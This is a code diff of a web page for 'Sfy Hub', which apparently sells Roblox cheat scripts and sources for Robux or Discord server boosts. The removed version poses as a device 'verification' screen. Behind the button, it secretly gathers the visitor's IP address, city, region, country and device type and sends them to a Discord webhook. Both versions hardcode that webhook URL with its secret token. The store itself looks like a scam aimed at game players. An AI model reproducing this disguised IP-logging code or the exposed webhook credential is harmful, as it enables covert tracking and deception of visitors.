@@ -1,574 +1,296 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ScriptHub - Verified Access</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sfy Hub's Paid Scripts And Sources!</title>
 
-        body {
-            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
-            color: #fff;
-            min-height: 100vh;
-            overflow-x: hidden;
-            position: relative;
-        }
+<!-- Google Font -->
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
 
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
+<style>
+:root {
+    --blue: #1e90ff;
+    --dark: #0a0f1e;
+    --card: #111a33;
+}
 
-        /* Verification Screen */
-        .verification-screen {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            text-align: center;
-            padding: 20px;
-            animation: fadeIn 1s ease-out;
-        }
+* {
+    box-sizing: border-box;
+    font-family: 'Poppins', sans-serif;
+}
 
-        .logo {
-            font-size: 5rem;
-            margin-bottom: 30px;
-            color: #4cc9f0;
-            text-shadow: 0 0 20px rgba(76, 201, 240, 0.5);
-            animation: pulse 2s infinite;
-        }
+body {
+    margin: 0;
+    background: radial-gradient(circle at top, #1e3cff, #0a0f1e 60%);
+    color: white;
+    min-height: 100vh;
+    animation: bgMove 10s infinite alternate;
+}
 
-        .title {
-            font-size: 3.5rem;
-            margin-bottom: 20px;
-            background: linear-gradient(45deg, #4cc9f0, #4361ee);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
-        }
+@keyframes bgMove {
+    0% { background-position: 0% 50%; }
+    100% { background-position: 100% 50%; }
+}
 
-        .subtitle {
-            font-size: 1.2rem;
-            margin-bottom: 40px;
-            color: #a9a9a9;
-            max-width: 600px;
-            line-height: 1.6;
-        }
+/* Header */
+header {
+    text-align: center;
+    padding: 25px 15px;
+}
 
-        .verify-btn {
-            background: linear-gradient(45deg, #4361ee, #3a0ca3);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 1.2rem;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 20px rgba(67, 97, 238, 0.3);
-            font-weight: 600;
-            letter-spacing: 1px;
-            position: relative;
-            overflow: hidden;
-        }
+header h1 {
+    font-size: 1.8rem;
+    font-weight: 700;
+    color: var(--blue);
+    animation: glow 2s infinite alternate;
+}
 
-        .verify-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 25px rgba(67, 97, 238, 0.4);
-        }
+@keyframes glow {
+    from { text-shadow: 0 0 5px #1e90ff; }
+    to { text-shadow: 0 0 20px #1e90ff; }
+}
 
-        .verify-btn:active {
-            transform: translateY(0);
-        }
+/* Tabs */
+.tabs {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 20px;
+}
 
-        .verify-btn::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: 0.5s;
-        }
+.tab {
+    padding: 10px 20px;
+    border-radius: 20px;
+    background: #111;
+    cursor: pointer;
+    transition: 0.3s;
+}
 
-        .verify-btn:hover::after {
-            left: 100%;
-        }
+.tab.active {
+    background: var(--blue);
+}
 
-        /* Loading Animation */
-        .loading {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 30px;
-        }
+/* Content */
+.container {
+    max-width: 900px;
+    margin: auto;
+    padding: 15px;
+}
 
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255, 255, 255, 0.2);
-            border-top: 5px solid #4cc9f0;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
+.section {
+    display: none;
+    animation: fade 0.5s ease-in-out;
+}
 
-        .loading-text {
-            font-size: 1.2rem;
-            color: #a9a9a9;
-        }
+.section.active {
+    display: block;
+}
 
-        /* Main Screen */
-        .main-screen {
-            display: none;
-            animation: fadeIn 1s ease-out;
-        }
+@keyframes fade {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
 
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 0;
-            margin-bottom: 30px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
+/* Card */
+.card {
+    background: var(--card);
+    border-radius: 16px;
+    padding: 20px;
+    margin-bottom: 20px;
+    box-shadow: 0 0 20px rgba(30,144,255,0.15);
+}
 
-        .user-info {
-            display: flex;
-            align-items: center;
-        }
+.card h2 {
+    color: var(--blue);
+    margin-top: 0;
+}
 
-        .user-avatar {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            background: linear-gradient(45deg, #4361ee, #4cc9f0);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
-            font-size: 1.5rem;
-        }
+.payment-buttons {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    margin-top: 15px;
+}
 
-        .user-details h2 {
-            font-size: 1.5rem;
-            margin-bottom: 5px;
-        }
+button {
+    border: none;
+    padding: 12px 18px;
+    border-radius: 12px;
+    cursor: pointer;
+    font-weight: 600;
+    transition: 0.3s;
+}
 
-        .user-details p {
-            color: #a9a9a9;
-            font-size: 0.9rem;
-        }
+button.primary {
+    background: var(--blue);
+    color: white;
+}
 
-        .script-card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 30px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-            transition: transform 0.3s ease;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
+button.secondary {
+    background: #222;
+    color: white;
+}
 
-        .script-card:hover {
-            transform: translateY(-10px);
-            background: rgba(255, 255, 255, 0.08);
-        }
+button:hover {
+    transform: scale(1.05);
+}
 
-        .script-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
+/* Modal */
+.modal {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.6);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 100;
+}
 
-        .script-title {
-            font-size: 1.8rem;
-            color: #4cc9f0;
-        }
+.modal-content {
+    background: var(--card);
+    padding: 25px;
+    border-radius: 16px;
+    width: 90%;
+    max-width: 400px;
+    text-align: center;
+    animation: fade 0.3s;
+}
 
-        .script-desc {
-            font-size: 1.1rem;
-            color: #e0e0e0;
-            margin-bottom: 20px;
-            line-height: 1.6;
-        }
+input {
+    width: 100%;
+    padding: 12px;
+    border-radius: 10px;
+    border: none;
+    margin: 15px 0;
+    outline: none;
+}
 
-        .script-details {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 25px;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 10px;
-        }
-
-        .detail-item {
-            text-align: center;
-        }
-
-        .detail-value {
-            font-size: 1.4rem;
-            font-weight: bold;
-            color: #4cc9f0;
-        }
-
-        .detail-label {
-            font-size: 0.9rem;
-            color: #a9a9a9;
-        }
-
-        .payment-methods {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin-top: 30px;
-        }
-
-        .payment-card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 25px;
-            width: 200px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .payment-card:hover {
-            transform: translateY(-10px);
-            background: rgba(255, 255, 255, 0.1);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
-        }
-
-        .payment-icon {
-            font-size: 3rem;
-            margin-bottom: 20px;
-        }
-
-        .payment-title {
-            font-size: 1.5rem;
-            margin-bottom: 10px;
-        }
-
-        .payment-price {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: #4cc9f0;
-        }
-
-        .footer {
-            text-align: center;
-            padding: 30px 0;
-            color: #a9a9a9;
-            font-size: 0.9rem;
-            margin-top: 30px;
-        }
-
-        /* Animations */
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .title {
-                font-size: 2.5rem;
-            }
-            
-            .script-card {
-                padding: 20px;
-            }
-            
-            .payment-methods {
-                flex-direction: column;
-                align-items: center;
-            }
-            
-            .payment-card {
-                width: 100%;
-                margin-bottom: 20px;
-            }
-        }
-    </style>
+/* Mobile */
+@media (max-width: 600px) {
+    header h1 {
+        font-size: 1.4rem;
+    }
+}
+</style>
 </head>
+
 <body>
-    <div class="container">
-        <!-- Verification Screen -->
-        <div class="verification-screen" id="verificationScreen">
-            <div class="logo">
-                <i class="fas fa-shield-alt"></i>
-            </div>
-            <h1 class="title">Verification</h1>
-            <p class="subtitle">Please verify your identity to access our paid scripts and services</p>
-            <button class="verify-btn" id="verifyButton">
-                <i class="fas fa-check-circle"></i> Verify Now
-            </button>
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <p class="loading-text">Verifying your device...</p>
-            </div>
-        </div>
 
-        <!-- Main Screen -->
-        <div class="main-screen" id="mainScreen">
-            <div class="header">
-                <div class="user-info">
-                    <div class="user-avatar">
-                        <i class="fas fa-user"></i>
-                    </div>
-                    <div class="user-details">
-                        <h2 id="userName">User Name</h2>
-                        <p id="userLocation">Location: Unknown</p>
-                    </div>
-                </div>
-            </div>
+<header>
+    <h1>Sfy Hub's Paid Scripts And Sources!</h1>
+</header>
 
-            <div class="script-card">
-                <div class="script-header">
-                    <h2 class="script-title">[UGC STEAL POINTS} Sfy Hub</h2>
-                </div>
-                <p class="script-desc">
-                    get 2M in just 20 minutes being afk! wait 3 days after
-                    your payment! please make sure to send your user in #i-wanna-buy
-                </p>
-                
-                <div class="script-details">
-                    <div class="detail-item">
-                        <div class="detail-value" id="userIP">0.0.0.0</div>
-                        <div class="detail-label">Your IP</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-value" id="userDevice">Unknown</div>
-                        <div class="detail-label">Device</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-value" id="userCountry">Unknown</div>
-                        <div class="detail-label">Country</div>
-                    </div>
-                </div>
-            </div>
+<div class="tabs">
+    <div class="tab active" onclick="switchTab('scripts')">Scripts</div>
+    <div class="tab" onclick="switchTab('sources')">Sources</div>
+</div>
 
-            <h2 style="text-align: center; margin: 30px 0;">Payment Methods</h2>
-            <div class="payment-methods">
-                <div class="payment-card" id="robuxCard">
-                    <div class="payment-icon">
-                        <i class="fab fa-roblox"></i>
-                    </div>
-                    <h3 class="payment-title">Robux</h3>
-                    <p class="payment-price">150 Robux</p>
-                </div>
-                <div class="payment-card" id="serverBoostCard">
-                    <div class="payment-icon">
-                        <i class="fab fa-discord"></i>
-                    </div>
-                    <h3 class="payment-title">Server Boost</h3>
-                    <p class="payment-price">1 Month</p>
-                </div>
+<div class="container">
+
+    <!-- Scripts -->
+    <div id="scripts" class="section active">
+        <div class="card">
+            <h2>Script Name</h2>
+            <p><b>What it does:</b> Premium advanced script with optimized features.</p>
+            <p><b>Delivery time:</b> Instant after payment</p>
+            <p><b>Payment Options:</b></p>
+
+            <div class="payment-buttons">
+                <button class="primary" onclick="startPayment('Script Name','Robux')">Robux</button>
+                <button class="secondary" onclick="startPayment('Script Name','Server Boost')">Server Boost</button>
             </div>
         </div>
     </div>
 
-    <div class="footer">
-        <p>© 2023 ScriptHub - All Rights Reserved</p>
+    <!-- Sources -->
+    <div id="sources" class="section">
+        <div class="card">
+            <h2>Source Name</h2>
+            <p><b>What it does:</b> Full editable source code.</p>
+            <p><b>Delivery time:</b> Instant after payment</p>
+            <p><b>Payment Options:</b></p>
+
+            <div class="payment-buttons">
+                <button class="primary" onclick="startPayment('Source Name','Robux')">Robux</button>
+                <button class="secondary" onclick="startPayment('Source Name','Server Boost')">Server Boost</button>
+            </div>
+        </div>
     </div>
 
-    <script>
-        // DOM Elements
-        const verificationScreen = document.getElementById('verificationScreen');
-        const mainScreen = document.getElementById('mainScreen');
-        const verifyButton = document.getElementById('verifyButton');
-        const loading = document.getElementById('loading');
-        const userName = document.getElementById('userName');
-        const userLocation = document.getElementById('userLocation');
-        const userIP = document.getElementById('userIP');
-        const userDevice = document.getElementById('userDevice');
-        const userCountry = document.getElementById('userCountry');
-        const robuxCard = document.getElementById('robuxCard');
-        const serverBoostCard = document.getElementById('serverBoostCard');
+</div>
 
-        // Device detection
-        function detectDevice() {
-            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-            
-            // Mobile detection
-            if (/android/i.test(userAgent)) {
-                return 'Android Device';
-            }
-            if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-                return 'iOS Device';
-            }
-            
-            // Desktop detection
-            return 'Desktop Computer';
-        }
+<!-- Modal -->
+<div class="modal" id="modal">
+    <div class="modal-content" id="modalContent">
+        <h3>Enter your Discord username</h3>
+        <input type="text" id="discordUser" placeholder="username#0000">
+        <button class="primary" onclick="confirmPayment()">Confirm</button>
+    </div>
+</div>
 
-        // IP detection
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error('Error fetching IP:', error);
-                return 'Unknown IP';
-            }
-        }
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1454529277776105656/vkNKA3XdmfMq7Hh7KirxEeE2IRcP_-h6w6eotHUKM7dbqMApBm_qKpdKe9ZEc_5T5A5W";
 
-        // Location detection
-        async function getLocation() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return {
-                    country: data.country_name,
-                    city: data.city,
-                    region: data.region,
-                    timezone: data.timezone
-                };
-            } catch (error) {
-                console.error('Error fetching location:', error);
-                return {
-                    country: 'lets keep it as a secret :)',
-                    city: 'LOL! chck dm pls :)',
-                    region: 'LOL! chck dm pls :)',
-                    timezone: 'UTC'
-                };
-            }
-        }
+let selectedItem = "";
+let selectedMethod = "";
 
-        // Send webhook
-        async function sendWebhook(ip, device, location) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1454529277776105656/vkNKA3XdmfMq7Hh7KirxEeE2IRcP_-h6w6eotHUKM7dbqMApBm_qKpdKe9ZEc_5T5A5W';
-            
-            const data = {
-                content: 'New Verification Request',
-                embeds: [{
-                    title: 'New Device Verification',
-                    color: 0x00ff00,
-                    fields: [
-                        {
-                            name: 'IP Address',
-                            value: ip,
-                            inline: true
-                        },
-                        {
-                            name: 'Device',
-                            value: device,
-                            inline: true
-                        },
-                        {
-                            name: 'Location',
-                            value: `${location.city}, ${location.region}, ${location.country}`,
-                            inline: true
-                        },
-                        {
-                            name: 'Timestamp',
-                            value: new Date().toISOString(),
-                            inline: true
-                        }
-                    ],
-                    footer: {
-                        text: 'ScriptHub Verification System'
-                    }
-                }]
-            };
+function switchTab(tab) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
 
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                });
-                
-                if (response.ok) {
-                    console.log('Webhook sent successfully');
-                } else {
-                    console.error('Failed to send webhook:', response.status);
-                }
-            } catch (error) {
-                console.error('Error sending webhook:', error);
-            }
-        }
+    document.querySelector(`[onclick="switchTab('${tab}')"]`).classList.add('active');
+    document.getElementById(tab).classList.add('active');
+}
 
-        // Verify button click
-        verifyButton.addEventListener('click', async () => {
-            // Show loading
-            loading.style.display = 'block';
-            verifyButton.disabled = true;
-            
-            try {
-                // Get device info
-                const device = detectDevice();
-                
-                // Get IP
-                const ip = await getIP();
-                
-                // Get location
-                const location = await getLocation();
-                
-                // Send webhook
-                await sendWebhook(ip, device, location);
-                
-                // Update UI with device info
-                userIP.textContent = ip;
-                userDevice.textContent = device;
-                userCountry.textContent = location.country;
-                userLocation.textContent = `${location.city}, ${location.region}`;
-                userName.textContent = 'Premium User';
-                
-                // Hide verification screen and show main screen
-                setTimeout(() => {
-                    verificationScreen.style.display = 'none';
-                    mainScreen.style.display = 'block';
-                }, 1500);
-            } catch (error) {
-                console.error('Verification failed:', error);
-                loading.querySelector('.loading-text').textContent = 'Verification failed. Please try again.';
-            }
-        });
+function startPayment(item, method) {
+    selectedItem = item;
+    selectedMethod = method;
+    document.getElementById("modal").style.display = "flex";
+}
 
-        // Payment cards click
-        robuxCard.addEventListener('click', () => {
-            window.open('https://www.roblox.com/game-pass/1613255628/Free-Points', '_blank');
-        });
+function confirmPayment() {
+    const user = document.getElementById("discordUser").value.trim();
+    if (!user) return alert("Please enter your Discord username");
 
-        serverBoostCard.addEventListener('click', () => {
-            window.open('https://discord.com/invite/bbna9WbA2a', '_blank');
-        });
+    fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            embeds: [{
+                title: "💰 New Purchase",
+                color: 3447003,
+                fields: [
+                    { name: "Item", value: selectedItem, inline: true },
+                    { name: "Payment Method", value: selectedMethod, inline: true },
+                    { name: "Discord User", value: user, inline: false }
+                ],
+                footer: { text: "Sfy Hub Website" }
+            }]
+        })
+    });
 
-        // Initialize with some demo data
-        window.addEventListener('load', () => {
-            // Set demo device info
-            userDevice.textContent = detectDevice();
-            userCountry.textContent = 'United States';
-            userLocation.textContent = 'New York, NY';
-        });
-    </script>
+    const modal = document.getElementById("modalContent");
+    modal.innerHTML = `
+        <h3>User Received!</h3>
+        <p>Please join this Server to get your purchased items</p>
+        <button class="primary" onclick="window.open('https://discord.com/invite/bbna9WbA2a','_blank')">
+            Join Discord Server
+        </button>
+        <br><br>
+        <p>Your payment method is ready! Click below.</p>
+        <button class="secondary" onclick="goToPayment()">Continue To The Selected Payment</button>
+    `;
+}
+
+function goToPayment() {
+    if (selectedMethod === "Robux") {
+        window.open("https://www.roblox.com/game-pass/1613255628/Free-Points","_blank");
+    } else {
+        window.open("https://discord.com/invite/bbna9WbA2a","_blank");
+    }
+}
+</script>
+
 </body>
 </html>
